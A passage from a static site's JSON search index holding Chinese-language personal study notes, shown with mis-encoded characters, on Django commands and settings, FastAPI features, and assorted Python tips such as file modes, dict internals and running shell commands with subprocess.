UUIDField","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-index.html"},{"title":"Django","text":"å­¦ä¹ è¿›åº¦: https://docs.djangoproject.com/zh-hans/3.2/topics/db/models/ ä¸‹çš„å­—æ®µé€‰é¡¹ æ‰§è¡ŒæŸ¥è¯¢ | Django æ–‡æ¡£ | Django (djangoproject.com) å‚è€ƒ:: ä½¿ç”¨Django ç¼–å†™ä½ çš„ç¬¬ä¸€ä¸ª Django åº”ç”¨ï¼Œç¬¬ 3 éƒ¨åˆ† åˆ›å»ºé¡¹ç›® æ¨¡å‹æ¨¡å—module è‡ªå®šä¹‰sql å†…éƒ¨ç±»Meta æŠ½è±¡åŸºç±» åå°ç®¡ç†æ¨¡å—admin settingså¸¸ç”¨å­—æ®µ åº”ç”¨æ‰“åŒ… æµ‹è¯• QuerySet-Api FQ é—®é¢˜æ€»ç»“ æ¨¡å‹ç±» æ–¹æ³• Model.save() Model.save(force_insert=False, force_update=False, using=DEFAULT_DB_ALIAS, update_fields=None For details on using the force_insert and force_update arguments, see å¼ºåˆ¶æ‰§è¡Œ INSERT æˆ– UPDATE . Details about the update_fields argument can be found in the æŒ‡å®šè¦ä¿å­˜çš„å­—æ®µ section. å¦‚æœä½ æƒ³è‡ªå®šä¹‰ä¿å­˜è¡Œä¸ºï¼Œä½ å¯ä»¥è¦†ç›–è¿™ä¸ª save() æ–¹æ³•ã€‚ æ›´å¤šç»†èŠ‚è¯·å‚è§ é‡å†™ä¹‹å‰å®šä¹‰çš„æ¨¡å‹æ–¹æ³• æ¨¡å‹ä¸­çš„ä¸€äº›å‡½æ•°/æ–¹æ³• __str__() è¿”å›å€¼è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡çš„str get_absolute_url() è®¡ç®—ä¸€ä¸ªå¯¹è±¡çš„url ä»»ä½•éœ€è¦ä¸€ä¸ªå”¯ä¸€urlçš„éƒ½éœ€è¦å®šä¹‰æ­¤æ–¹æ³• å¸¸ç”¨æŒ‡ä»¤ å¸¸ç”¨æŒ‡ä»¤: # æŸ¥çœ‹djangoä½ç½® python -c \"import django; print(django.__path__)\" # æ‰“å¼€djangoè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…· python manage.py shell # å¯åŠ¨ pollsåº”ç”¨çš„è‡ªåŠ¨åŒ–æµ‹è¯• python manage.py test polls # åˆ›å»º django é¡¹ç›® $ django-admin startproject $pro # å®‰è£…æ¨¡å—app $ python manage.py startapp $app # å¯åŠ¨æœåŠ¡ $ python manage.py runserver 0:8000 # æŸ¥æ‰¾æ‰€æœ‰å¯ç”¨çš„æ¨¡å‹ ä¸ºä»»æ„ä¸€ä¸ªåœ¨æ•°æ®åº“ä¸­ä¸å­˜åœ¨å¯¹åº”æ•°æ®è¡¨çš„æ¨¡å‹åˆ›å»ºè¿ç§»è„šæœ¬æ–‡ä»¶ $ python manage.py makemigrations # è¿è¡Œè¿™äº›è¿ç§»æ¥è‡ªåŠ¨åˆ›å»ºæ•°æ®åº“è¡¨ # migrate å‘½ä»¤åªä¼šä¸ºåœ¨ INSTALLED_APPS é‡Œå£°æ˜äº†çš„åº”ç”¨è¿›è¡Œæ•°æ®åº“è¿ç§»ã€‚ $ python manage.py migrate # åˆ›å»ºæŸä¸ªappçš„è¡¨ç»“æ„ $ python manage.py makemigrations $app $ python manage.py migrate # å« django çš„ç¯å¢ƒå˜é‡shell $ python manage.py shell url path å››ä¸ªå‚æ•°: # view å¯ä»¥æ˜¯ ä½¿ç”¨ include() ä½¿ç”¨å…¶ä»–çš„appä¸‹çš„url # name åˆ«å path('route', view.fun, name='') åˆ›å»ºç®¡ç†å‘˜ç”¨æˆ·: $ python manage.py createsuperuser Username: admin Email address: admin@example.com Password: ********** Password (again): ********* Superuser created successfully. æ•°æ®åº“çš„è®¾ç½® setting.py: DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql', 'NAME': 'mydatabase', 'USER': 'mydatabaseuser', 'PASSWORD': 'mypassword', 'HOST': '127.0.0.1', 'PORT': '5432', } } é»˜è®¤çš„ï¼ŒDjango ä¼šåœ¨å¤–é”®å­—æ®µååè¿½åŠ å­—ç¬¦ä¸² \"_id\" ã€‚ï¼ˆåŒæ ·ï¼Œè¿™ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ã€‚ï¼‰ å¤–é”® pkå°±æ˜¯primary keyçš„ç¼©å†™ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ¨¡å‹çš„ä¸»é”®ä¸º\"id\"ï¼Œæ‰€ä»¥ä¸‹é¢ä¸‰ä¸ªè¯­å¥çš„æ•ˆæœä¸€æ ·: > Blog.objects.get(id__exact=14) # Explicit form > Blog.objects.get(id=14) # __exact is implied > Blog.objects.get(pk=14) # pk implies id__exact å‚è€ƒ: æŸ¥è¯¢æ“ä½œ webçš„ç“¶é¢ˆ å•ä¸ªè¯·æ±‚é‡Œå¤ªå¤šsqlä¸²è¡ŒæŸ¥è¯¢å¯¼è‡´è€—æ—¶é•¿ å•ä¸ªsqlå¤ªè¿‡å¤æ‚å¯¼è‡´è€—æ—¶é•¿","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-index.html"},{"title":"FastAPI","text":"å®˜ç½‘æ–‡æ¡£: FastAPI èœé¸Ÿ: FastAPIæ•™ç¨‹ æ³¨è§£ å¦‚æœä½ æ­£åœ¨å¼€å‘ä¸€ä¸ªåœ¨ç»ˆç«¯ä¸­è¿è¡Œçš„å‘½ä»¤è¡Œåº”ç”¨è€Œä¸æ˜¯ web APIï¼Œä¸å¦¨è¯•ä¸‹ Typer . Typer æ˜¯ FastAPI çš„å°åŒèƒã€‚å®ƒæƒ³è¦æˆä¸ºå‘½ä»¤è¡Œä¸­çš„ FastAPIã€‚ å…³é”®ç‰¹æ€§ å¿«é€Ÿï¼šå¯ä¸ NodeJS å’Œ Go å¹¶è‚©çš„æé«˜æ€§èƒ½ï¼ˆå½’åŠŸäº Starlette å’Œ Pydanticï¼‰ã€‚æœ€å¿«çš„ Python web æ¡†æ¶ä¹‹ä¸€ã€‚ é«˜æ•ˆç¼–ç ï¼šæé«˜åŠŸèƒ½å¼€å‘é€Ÿåº¦çº¦ 200ï¼… è‡³ 300ï¼…ã€‚* æ›´å°‘ bugï¼šå‡å°‘çº¦ 40ï¼… çš„äººä¸ºï¼ˆå¼€å‘è€…ï¼‰å¯¼è‡´é”™è¯¯ã€‚* æ™ºèƒ½ï¼šæä½³çš„ç¼–è¾‘å™¨æ”¯æŒã€‚å¤„å¤„çš†å¯è‡ªåŠ¨è¡¥å…¨ï¼Œå‡å°‘è°ƒè¯•æ—¶é—´ã€‚ ç®€å•ï¼šè®¾è®¡çš„æ˜“äºä½¿ç”¨å’Œå­¦ä¹ ï¼Œé˜…è¯»æ–‡æ¡£çš„æ—¶é—´æ›´çŸ­ã€‚ ç®€çŸ­ï¼šä½¿ä»£ç é‡å¤æœ€å°åŒ–ã€‚é€šè¿‡ä¸åŒçš„å‚æ•°å£°æ˜å®ç°ä¸°å¯ŒåŠŸèƒ½ã€‚bug æ›´å°‘ã€‚ å¥å£®ï¼šç”Ÿäº§å¯ç”¨çº§åˆ«çš„ä»£ç ã€‚è¿˜æœ‰è‡ªåŠ¨ç”Ÿæˆçš„äº¤äº’å¼æ–‡æ¡£ã€‚ æ ‡å‡†åŒ–ï¼šåŸºäºï¼ˆå¹¶å®Œå…¨å…¼å®¹ï¼‰API çš„ç›¸å…³å¼€æ”¾æ ‡å‡†ï¼šOpenAPI (ä»¥å‰è¢«ç§°ä¸º Swagger) å’Œ JSON Schemaã€‚ FastAPI ç‰¹ç‚¹ é«˜æ€§èƒ½ï¼š åŸºäºStarletteå’ŒPydanticï¼Œåˆ©ç”¨å¼‚æ­¥ï¼ˆasynchronousï¼‰ç¼–ç¨‹ï¼Œæä¾›å‡ºè‰²çš„æ€§èƒ½ã€‚ è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆï¼š è‡ªåŠ¨ç”Ÿæˆäº¤äº’å¼APIæ–‡æ¡£ï¼Œæ”¯æŒSwagger UIå’ŒReDocï¼Œè®©APIçš„ç†è§£å’Œæµ‹è¯•æ›´åŠ ç›´è§‚ã€‚ ç±»å‹æ³¨è§£æ”¯æŒï¼š åˆ©ç”¨Pythonçš„ç±»å‹æç¤ºï¼Œæä¾›æ›´ä¸¥æ ¼çš„è¾“å…¥éªŒè¯å’Œæ›´å¥½çš„ä»£ç æç¤ºã€‚ å¼‚æ­¥æ”¯æŒï¼š æ”¯æŒå¼‚æ­¥è¯·æ±‚å¤„ç†ï¼Œä½¿å¾—å¤„ç†IOå¯†é›†å‹ä»»åŠ¡æ›´åŠ é«˜æ•ˆã€‚ FastAPI é€‚ç”¨åœºæ™¯ æ„å»ºAPIåç«¯ï¼š ç”¨äºæ„å»ºRESTful APIï¼Œæ”¯æŒå‰åç«¯åˆ†ç¦»çš„Webåº”ç”¨ã€‚ å¾®æœåŠ¡æ¶æ„ï¼š å¯ä»¥ä½œä¸ºå¾®æœåŠ¡çš„åç«¯æ¡†æ¶ï¼Œæ”¯æŒå¿«é€Ÿå¼€å‘å’Œéƒ¨ç½²ã€‚ æ•°æ®å¤„ç†APIï¼š é€‚ç”¨äºå¤„ç†æ•°æ®ï¼Œæ¥æ”¶å’Œè¿”å›JSONæ•°æ®ã€‚ å®æ—¶é€šä¿¡ï¼š æ”¯æŒWebSocketï¼Œé€‚ç”¨äºå®æ—¶é€šä¿¡åœºæ™¯ã€‚ ä¸ºä»€ä¹ˆé€‰æ‹© FastAPIï¼Ÿ Pythonicï¼š ä½¿ç”¨Pythonçš„è‡ªç„¶è¯­æ³•å’Œç±»å‹æç¤ºï¼Œé™ä½å­¦ä¹ æ›²çº¿ã€‚ æ€§èƒ½ä¼˜è¶Šï¼š åˆ©ç”¨å¼‚æ­¥ç¼–ç¨‹å’Œåº•å±‚çš„Starletteæ¡†æ¶ï¼Œæä¾›å“è¶Šçš„æ€§èƒ½ã€‚ æ–‡æ¡£å‹å¥½ï¼š è‡ªåŠ¨ç”Ÿæˆäº¤äº’å¼æ–‡æ¡£ï¼Œå‡å°‘æ–‡æ¡£ç»´æŠ¤çš„å·¥ä½œé‡ã€‚ ç”Ÿæ€ç³»ç»Ÿï¼š åŸºäºPythonç”Ÿæ€ç³»ç»Ÿï¼Œå¯ä»¥æ–¹ä¾¿åœ°é›†æˆå„ç§åº“å’Œå·¥å…·ã€‚ ç»“æ„è¯¦è§£ å®‰è£…é…ç½® ç®€å•ä½¿ç”¨ äº¤äº’å¼APIæ–‡æ¡£ åŸºæœ¬è·¯ç”± è¯·æ±‚å’Œå“åº” FastAPI-Pydanticæ¨¡å‹ è·¯å¾„æ“ä½œä¾èµ–é¡¹ è¡¨å•æ•°æ® å¸¸è§é—®é¢˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-index.html"},{"title":"Pythonæ¡†æ¶","text":"æ­¤èŠ‚ä¸»è¦æ˜¯Webæ¡†æ¶ Django FastAPI","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-index.html"},{"title":"Pythoné—®é¢˜æ€»ç»“","text":"pythoné‡å†™çˆ¶ç±»å‚æ•°åˆ—è¡¨é—®é¢˜ Sphinxä½¿ç”¨ å­—ç¬¦ä¸²è¡¥0","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-index.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-index.html"},{"title":"cookbook","text":"å‡½æ•° ç½‘ç»œä¸ Web ç¼–ç¨‹ å…ƒç¼–ç¨‹ æ–‡ä»¶ã€IO å¹¶å‘ç¼–ç¨‹ æ¨¡å—ä¸åŒ… ç±»ä¸å¯¹è±¡ å­—ç¬¦ä¸²æ“ä½œ æ•°æ®ç¼–ç å’Œå¤„ç† è¿­ä»£å™¨ã€ç”Ÿæˆå™¨ æ•°å­—ã€æ—¥æœŸã€æ—¶é—´ æµ‹è¯•ã€è°ƒè¯•å’Œå¼‚å¸¸ è„šæœ¬ç¼–ç¨‹ä¸ç³»ç»Ÿç®¡ç†","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-index.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-index.html"},{"title":"Python","text":"Webæ¡†æ¶ cookbook ç›¸å…³æŠ€æœ¯å®ç° pythonä¸‰æ–¹åº“ pythonæ ‡å‡†åº“ æ¦‚å¿µç›¸å…³ æ€§èƒ½åˆ†æ åŒ…ç®¡ç†å™¨ é—®é¢˜æ€»ç»“ æ•™ç¨‹ python ä¸­ := çš„ä½œç”¨ éƒ¨åˆ†è¯­è¨€ä¸­ := æ˜¯ä¸€ä¸ªèµ‹å€¼è¯­å¥ pythonæ­£å¸¸æ¥è¯´æ˜¯æ²¡æœ‰è¿™ç§è¿™ç§è¯­æ³•çš„ ä¸è¿‡æœ‰ä¸€ç§ç‰¹æ®Šæƒ…å†µæ˜¯ç”¨äºç”Ÿæˆå¼çš„èµ‹å€¼æ“ä½œ [x for x in range(10)] # [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] [y for x in range(10) if (y:=(x*2))] # [2, 4, 6, 8, 10, 12, 14, 16, 18] (æš‚æ—¶åªè§è¿‡è¿™ç§æƒ…å†µ) pythonçš„å•åŒå¼•å· åŸºæœ¬æ²¡æœ‰å·®åˆ«ï¼Œæ··åˆä½¿ç”¨å¯ä»¥å‡å°‘è½¬ä¹‰: >#åŒ…å«å•å¼•å·å­—ç¬¦ä¸² >my_str = 'I\\'m a student' >my_str = \"I'm a student\" > >#åŒå¼•å· >my_str = \"Jason said \\\"I like you\\\"\" >my_str = 'Jason said \"I like you\"' æ–‡ä»¶è¯»å†™æ¨¡å¼ python æ–‡ä»¶å¤„ç†çš„æ‰“å¼€æ–¹å¼æœ‰å¾ˆå¤šç§: os.mknod(\"test.txt\") # åˆ›å»ºç©ºæ–‡ä»¶ fp = open(\"test.txt\",w) # ç›´æ¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–‡ä»¶ è¿™é‡Œä¸»è¦ä»‹ç»open æ¨¡å¼, è¦äº†è§£æ–‡ä»¶è¯»å†™æ¨¡å¼ï¼Œéœ€è¦äº†è§£å‡ ç§æ¨¡å¼çš„åŒºåˆ«ï¼Œä»¥åŠå¯¹åº”æŒ‡é’ˆ r è¯»å–æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šæŠ¥é”™ w å†™å…¥æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šå…ˆåˆ›å»ºå†å†™å…¥ï¼Œä¼šè¦†ç›–åŸæ–‡ä»¶ a å†™å…¥æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šå…ˆåˆ›å»ºå†å†™å…¥ï¼Œä½†ä¸ä¼šè¦†ç›–åŸæ–‡ä»¶ï¼Œè€Œæ˜¯è¿½åŠ åœ¨æ–‡ä»¶æœ«å°¾ rb,wb,ab åˆ†åˆ«äºr,w,aç±»ä¼¼ï¼Œä½†æ˜¯ç”¨äºè¯»å†™äºŒè¿›åˆ¶æ–‡ä»¶ r+ å¯è¯»ã€å¯å†™ï¼Œæ–‡ä»¶ä¸å­˜åœ¨ä¹Ÿä¼šæŠ¥é”™ï¼Œå†™æ“ä½œæ—¶ä¼šè¦†ç›–; å³å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œä¿å­˜åŸæœ‰å†…å®¹ï¼Œè¿½åŠ å†™å†…å®¹ï¼Œå†™åŠ¨ä½œåˆ™æ˜¯è¿½åŠ çš„æ–°å†…å®¹ã€‚å…¶ä½œç”¨å’Œa+åŸºæœ¬ç›¸åŒã€‚ w+ å¯è¯»ï¼Œå¯å†™ï¼Œæ–‡ä»¶ä¸å­˜åœ¨å…ˆåˆ›å»ºï¼Œä¼šè¦†ç›–; å³w+æ˜¯æ‰“å¼€åï¼Œæ¸…ç©ºåŸæœ‰å†…å®¹ï¼Œæˆä¸ºä¸€ä¸ªæ–°çš„ç©ºæ–‡ä»¶ï¼Œå¯¹è¿™ä¸ªç©ºæ–‡ä»¶å…·æœ‰è¯»å†™æƒé™ã€‚ a+ å¯è¯»ã€å¯å†™ï¼Œæ–‡ä»¶ä¸å­˜åœ¨å…ˆåˆ›å»ºï¼Œä¸ä¼šè¦†ç›–ï¼Œè¿½åŠ åœ¨æœ«å°¾ rb+ ä»¥äºŒè¿›åˆ¶è¯»å†™æ¨¡å¼æ‰“å¼€ (å‚è§ r+ ) wb+ ä»¥äºŒè¿›åˆ¶è¯»å†™æ¨¡å¼æ‰“å¼€ (å‚è§ w+ ) ab+ ä»¥äºŒè¿›åˆ¶è¯»å†™æ¨¡å¼æ‰“å¼€ (å‚è§ a+ ) å‚è€ƒ: https://blog.csdn.net/longshenlmj/article/details/9921665 åœ¨linuxä½¿ç”¨pyé‡åˆ°çš„ä¸€äº›é—®é¢˜ pkg_resources.DistributionNotFound: pip==0.8.1 å…·ä½“æŠ¥é”™å¦‚ä¸‹: $ sudo pip install gevent-websocket Traceback (most recent call last): File \"/usr/local/bin/pip\", line 5, in <module> from pkg_resources import load_entry_point File \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 2675, in <module> parse_requirements(__requires__), Environment() File \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 552, in resolve raise DistributionNotFound(req) pkg_resources.DistributionNotFound: pip==0.8.1 å¯ä»¥ä½¿ç”¨which pipæŸ¥çœ‹ä¸€ä¸‹å‘½ä»¤çš„ä½ç½®ï¼Œç„¶åvimæŸ¥çœ‹ä¸€ä¸‹ï¼Œ ä¼šå‘ç°æ–‡ä»¶é‡Œæ˜¯å®šæ­»äº†ç‰ˆæœ¬å·çš„ï¼Œæƒ³åŠæ³•æ”¹ä¸€ä¸‹ å¯èƒ½æ˜¯å®‰è£…äº†å¤šä¸ªpipç‰ˆæœ¬æˆ–è€…pipç®¡ç†åŒ…å·¥å…·å¼•èµ·çš„ æœ€ç»ˆçš„è§£å†³æ–¹æ¡ˆ: which pip # /usr/local/bin/pip python -m pip install --upgrade --force pip==9 #è¿™é‡Œæˆ‘éœ€è¦çš„æ˜¯9ç‰ˆæœ¬çš„pip cat /usr/local/bin/pip2.7 >/usr/local/bin/pip #è¿™é‡Œæ˜¯whichä½ç½® which pip # /usr/bin/local è¿™é‡Œå› ä¸ºæˆ‘è‡ªå·±è®¾ç½®çš„åŸå› æœ‰ä¸€ä¸ª ln -s /usr/local/bin/pip2.7 /usr/bin/local ## # æºæ–‡ä»¶/usr/bin/localå’Œ/usr/local/bin/pipéƒ½é™åˆ¶æ­»äº†pipç‰ˆæœ¬ï¼ŒæŠŠæ­£ç¡®çš„å†™è¿›å» ## å…³äºpythonçš„å­—å…¸ python3.6ä¹‹å‰çš„dictéƒ½æ˜¯æ— åºçš„ å½“ç‰ˆæœ¬ >= 3.6 æ—¶ï¼Œå­—å…¸ä¸ºæœ‰åºçš„ py3.6 ä¹‹å‰çš„æ— åºå­—å…¸: > æ˜¯ä»¥å…«è¡Œä¸‰åˆ—çš„æ•°æ®ç»“æ„å­˜å‚¨ > > æ¯ä¸€è¡Œæœ‰ä¸‰åˆ—ï¼Œæ¯ä¸€åˆ—å ç”¨8byteçš„å†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥æ¯ä¸€è¡Œä¼šå ç”¨24byteçš„å†…å­˜ç©ºé—´ > > ç¬¬ä¸€åˆ—ï¼šå“ˆå¸Œå€¼å¯¹8å–ä½™ hash(sKey) > > ç¬¬äºŒåˆ—ï¼šsKey > > ç¬¬ä¸‰åˆ—ï¼šsValue å½“å­—å…¸çš„é”®å€¼å¯¹æ•°é‡è¶…è¿‡å½“å‰æ•°ç»„é•¿åº¦çš„2/3æ—¶ï¼Œæ•°ç»„ä¼šè¿›è¡Œæ‰©å®¹ï¼Œ 8è¡Œå˜æˆ16è¡Œï¼Œ16è¡Œå˜æˆ32è¡Œã€‚ é•¿åº¦å˜äº†ä»¥åï¼ŒåŸæ¥çš„ä½™æ•°ä½ç½®ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ­¤æ—¶å°±éœ€è¦ç§»åŠ¨åŸæ¥ä½ç½®çš„æ•°æ®ï¼Œå¯¼è‡´æ’å…¥æ•ˆç‡å˜ä½ã€‚ py3.6ä¹‹å: > æ¢æˆäº†ä¸¤ä¸ªä¸€ç»´åˆ—è¡¨ç»„æˆ my_dict = {} æ­¤æ—¶çš„å†…å­˜ç¤ºæ„å›¾ ï¼ˆindices æŒ‡æ•° entries æ¡ç›®ï¼‰: indices = [None, None, None, None, None, None, None, None] entries = [] è¿™é‡Œå…ˆé€šè¿‡å¯¹ sKey å–ä½™ä¸º x ï¼Œç„¶å åœ¨ entries æ’å…¥ä¸€ä¸ªåˆ—è¡¨ [ \"hashå€¼\", sKey, sValue] å†åœ¨ indices ä¿å­˜æ’å…¥åˆ—è¡¨çš„ä¸‹æ ‡ï¼Œindices[x] = ä¸‹æ ‡ Pythonè‡ªå¸¦çš„è¿™ä¸ª hash å‡½æ•°ï¼Œå’Œæˆ‘ä»¬ä¼ ç»Ÿä¸Šè®¤ä¸ºçš„Hashå‡½æ•°æ˜¯ä¸ä¸€æ ·çš„ã€‚ Pythonè‡ªå¸¦çš„è¿™ä¸ª hash å‡½æ•°è®¡ç®—å‡ºæ¥çš„å€¼ï¼Œåªèƒ½ä¿è¯åœ¨æ¯ä¸€ä¸ªè¿è¡Œæ—¶çš„æ—¶å€™ä¸å˜ï¼Œ ä½†æ˜¯å½“ä½ å…³é—­Pythonå†é‡æ–°æ‰“å¼€ï¼Œé‚£ä¹ˆå®ƒçš„å€¼å°±å¯èƒ½ä¼šæ”¹å˜ï¼Œ å…³äºè´Ÿæ•°å–ä½™ å¸¦ä½™é™¤æ³•ï¼Œ å¯¹äºä»»æ„ä¸€ä¸ªæ•´æ•°n ï¼Œéƒ½å¯ä»¥è¡¨ç¤ºä¸º n=k*q + r ï¼Œå…¶ä¸­ 0 <= r < q è¿™é‡Œçš„ r å°±æ˜¯ n é™¤ä»¥ q çš„ä½™æ•°ï¼Œé€šå¸¸è®°åš nâ‰¡r(mod q) ä¾‹å¦‚-9=(-2)*5+1ï¼Œåˆ™-9é™¤ä»¥5çš„ä½™æ•°ä¸º1ã€‚ æ³¨ï¼šjava ä¸­ % ä¼˜å…ˆçº§é«˜äº - é¡¹ç›®ç®¡ç†å·¥å…· æ‰å‘ç°pythonå±…ç„¶æ²¡æœ‰é¡¹ç›®ç®¡ç†å·¥å…·æ¯”å¦‚maven åªæœ‰ä¸ªpip /docs/åç«¯/python/åŒ…ç®¡ç†å™¨ pythonçš„æŒ‰ä½ä¸ã€æˆ– åŒä¸º 2çš„næ¬¡æ–¹ çš„æ•° æŒ‰ä½æˆ–çš„å€¼ç­‰äºå„ä¸ªæ•°ç›¸åŠ  å¹¶ä¸”ç”¨å…¶ä¸­çš„ä¸€ä¸ªå€¼å’Œæœ€ç»ˆçš„æ•°ä¸ä¼šå¾—åˆ°ä»–æœ¬èº«ï¼Œåä¹‹ä¸º0: if __name__ == '__main__': a, b, c = 2, 4, 8 d = a | b | c print(d) print(a & d) print(d & c) print(32 & d) print(32 & c) # 14 # 2 # 8 # 0 # 0 ä¸€äº›æ–œæ è½¬ä¹‰ è½¬ä¹‰å­—ç¬¦ , é¡¾åæ€ä¹‰ï¼Œä¹Ÿå°±æ˜¯åœ¨æˆ‘ä»¬ç¼–ç æ—¶ä¼šä½¿ç”¨åˆ°çš„ç‰¹æ®Šå­—ç¬¦: | è½¬ä¹‰å­—ç¬¦ | æè¿° | | ----------------- | ---------- | | \\ï¼ˆå¤„äºè¡Œå°¾ä½ç½®ï¼‰ | ç»­è¡Œç¬¦ | | \\\\ | åæ–œæ  | | ' | å•å¼•å· | | \\\" | åŒå¼•å· | | \\b | é€€æ ¼ | | \\n | æ¢è¡Œ | | \\v | çºµå‘åˆ¶è¡¨ç¬¦ | | \\t | æ¨ªå‘åˆ¶è¡¨ç¬¦ | | \\r | å›è½¦ | | \\f | æ¢é¡µ | pythonæ‰§è¡Œlinuxå‘½ä»¤ code: import subprocess import os def subprocess_(): \"\"\" subprocessæ¨¡å—æ‰§è¡Œlinuxå‘½ä»¤ :return: \"\"\" subprocess.call(\"ls\") # æ‰§è¡Œlså‘½ä»¤ def system_(): \"\"\" systemæ¨¡å—æ‰§è¡Œlinuxå‘½ä»¤ :return: \"\"\" # ä½¿ç”¨systemæ¨¡å—æ‰§è¡Œlinuxå‘½ä»¤æ—¶ï¼Œå¦‚æœæ‰§è¡Œçš„å‘½ä»¤æ²¡æœ‰è¿”å›å€¼resçš„å€¼æ˜¯256 # å¦‚æœæ‰§è¡Œçš„å‘½ä»¤æœ‰è¿”å›å€¼ä¸”æˆåŠŸæ‰§è¡Œï¼Œè¿”å›å€¼æ˜¯0 res = os.system(\"ls\") def popen_(): \"\"\" popenæ¨¡å—æ‰§è¡Œlinuxå‘½ä»¤ã€‚è¿”å›å€¼æ˜¯ç±»æ–‡ä»¶å¯¹è±¡ï¼Œè·å–ç»“æœè¦é‡‡ç”¨read()æˆ–è€…readlines() :return: \"\"\" val = os.popen('ls').read() # æ‰§è¡Œç»“æœåŒ…å«åœ¨valä¸­ def main(): subprocess_() # æ–¹æ³•1 system_() # æ–¹æ³•2 popen_() # æ–¹æ³•3 if __name__ == '__main__': main() èµ‹å€¼ å¿«é€Ÿèµ‹å€¼: a=b=c=[] # å› ä¸º[]æ˜¯å¯å˜çš„, a b c å…±äº«å†…å­˜ è®¾è®¡æ¨¡å¼ https://refactoringguru.cn/design-patterns/catalog å…³äºå¤šçº¿ç¨‹é˜Ÿåˆ—å®ç° /docs/åç«¯/python/pythonæ ‡å‡†åº“/threading é˜Ÿåˆ—æ˜¯åŸºäºåŒå‘é˜Ÿåˆ— dedque å®ç° /docs/åç«¯/python/pythonæ ‡å‡†åº“/multiprocessing é˜Ÿåˆ—æ˜¯åŸºäº ç®¡é“ pipe å®ç° æœ‰æœ€å¤§é™åˆ¶ï¼Œwin10æ˜¯1408ï¼Œlinuxæ˜¯6570 å…³äºå¯é‡å…¥é” ä¸ºä»€ä¹ˆè¦æœ‰å¯é‡å…¥é”ï¼Ÿ å½“å­˜åœ¨ç»§æ‰¿æˆ–è€…é€’å½’è°ƒç”¨çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå‡ºç°é‡å¤åŠ é”çš„æƒ…å†µï¼Œ å¦‚æœä¸èƒ½é‡å¤åŠ é”ï¼Œå°±ä¼šè‡ªå·±æŠŠè‡ªå·±ç»™é”æ­» *args, **kwargs å•ä¸ª * è¡¨ç¤ºå…ƒç»„åˆ—è¡¨ ** è¡¨ç¤ºè½¬æ¢ä¸ºå­—å…¸ è¿™ä¸ªæ—¶å€™é¦–å±‚çš„å­—å…¸çš„é”®å¿…é¡»ä¸ºå­—ç¬¦ä¸² pythonä¸‰ç§åŸºç¡€åºåˆ—ç±»å‹ list å¯å˜åºåˆ—ï¼Œå­˜æ”¾åŒç±»é¡¹ç›®çš„é›†åˆ tuple ä¸å¯å˜åºåˆ—ï¼Œå­˜æ”¾å›ºå®šé•¿åº¦çš„ä¸åŒç§ç±»çš„å¯¹è±¡é›†åˆ range ä¸å¯å˜çš„æ•°å­—åºåˆ—ï¼Œé€šå¸¸åœ¨forå¾ªç¯ä¸­å¾ªç¯æŒ‡å®šçš„æ¬¡æ•° ä¸€äº›ä¼˜åŒ–å»ºè®® åˆ›å»ºåˆ—è¡¨æ—¶ï¼Œå»ºè®®æœ‰åˆå§‹å€¼å°±å†™åˆå§‹å€¼ï¼Œä¸è¦åˆ›å»ºç©ºåˆ—è¡¨å†å¡«å……ã€‚å› ä¸ºåˆ›å»ºç©ºåˆ—è¡¨ä¸€å®šä¼šæ‰©å®¹ åˆ—è¡¨çš„åˆå¹¶ï¼Œä½¿ç”¨ extendæˆ–è€… += è¾ƒå¥½äºç›´æ¥ + pyhtonçš„é€‰é¡¹ æ‰§è¡Œæ—¶ä¸ç”Ÿæˆpycæ–‡ä»¶: python -B è·å–å¯¹è±¡/æ–‡ä»¶å¤§å° å¯¹è±¡ ä½¿ç”¨ sys.getsizeof() è·å–ç¨‹åºä¸­å£°æ˜çš„ä¸€ä¸ªæ•´æ•°ï¼Œå­˜å‚¨åœ¨å˜é‡ä¸­çš„å¤§å° ç›¸ä¼¼åœºæ™¯ï¼šæ–‡ä»¶å¤åˆ¶æ¡ˆä¾‹ä¸­éœ€è¦è·å–æ–‡ä»¶å¤§å°ï¼Œå°è¯•ä½¿ç”¨ sys.getsizeof()æ–¹æ³• ç¡®è®¤ï¼šsys.getsizeof()æ–¹æ³•ç”¨äºè·å–å˜é‡ä¸­å­˜å‚¨æ•°æ®çš„å¤§å° è¯¦ç»†å¯å‚è€ƒ: /docs/åç«¯/python/pythonæ ‡å‡†åº“/sys æ–‡ä»¶ ä½¿ç”¨: os.path.getsize(path) è·å–æŒ‡å®šè·¯å¾„ path 